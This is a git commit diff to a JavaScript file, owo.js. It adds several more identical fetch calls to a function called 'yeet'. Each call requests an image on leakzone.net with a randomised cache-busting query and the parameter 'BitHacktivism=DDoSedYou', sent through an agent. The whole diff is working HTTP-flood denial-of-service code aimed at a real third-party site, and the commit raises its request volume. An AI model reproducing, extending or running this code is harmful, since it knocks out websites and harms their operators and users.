6b740980e177e166a2a472b9127de53b51ece9b5
SwxtchCode <swxtchcode@protonmail.com>
2020-11-29 15:09:05 -0800

    Update owo.js

--- owo.js
+++ owo.js
@@ -15,7 +15,7 @@ yeet = () => {
 fetch("https://leakzone.net/uploads/avatars/avatar_14107.png?dateline=1591716527&daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});
   fetch("https://leakzone.net/uploads/avatars/avatar_14107.png?dateline=1591716527&daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});
 fetch("https://leakzone.net/uploads/avatars/avatar_14107.png?dateline=1591716527&daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});
-
+fetch("https://leakzone.net/uploads/avatars/avatar_14107.png?dateline=1591716527&daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});fetch("https://leakzone.net/uploads/avatars/avatar_14107.png?dateline=1591716527&daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});fetch("https://leakzone.net/uploads/avatars/avatar_14107.png?dateline=1591716527&daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});fetch("https://leakzone.net/uploads/avatars/avatar_14107.png?dateline=1591716527&daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});
 }
 
 
